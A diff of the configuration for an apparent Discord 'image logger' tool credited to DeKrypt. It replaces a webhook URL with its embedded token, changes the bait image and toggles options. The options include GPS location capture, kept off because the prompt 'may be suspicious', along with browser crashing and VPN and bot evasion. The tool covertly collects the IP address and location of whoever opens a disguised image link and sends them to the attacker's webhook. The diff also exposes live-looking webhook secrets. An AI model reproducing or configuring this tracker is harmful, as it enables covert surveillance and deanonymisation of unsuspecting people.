@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1094438177076424744/sGNWvMGAvhW-nHGoUyyRVIKAQK2kXybksnLiw6Ek-BUlWPE9pNYVP2GKMQsrLw5V02Zw",
-    "image": "https://th.bing.com/th/id/R.8043fdb1646b642f1127b9cf383806a4?rik=xpvgTVsl0sqCWw&riu=http%3a%2f%2f2.bp.blogspot.com%2f-Htx5k7K8fuw%2fTbDjr8y0guI%2fAAAAAAAAAE8%2f5-ArdiBYdPU%2fs1600%2fabg50.jpg&ehk=W1HGgRVAQeOpl4TQvuSQ4v8JyT1JmMN0Qro%2bfdEmPi4%3d&risl=&pid=ImgRaw&r=0", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1100505537151508552/wYHT3xMLZvwNEn_bhK-Yz2VYeoEHJWAdenxNc3nT8PU-AnmJeAqIztiZHTNtBU-MfJH3",
+    "image": "https://th.bing.com/th/id/OIP.jhzP9Df5fgJzHGb30YrAHgAAAA?pid=ImgDet&rs=1", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
@@ -37,7 +37,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
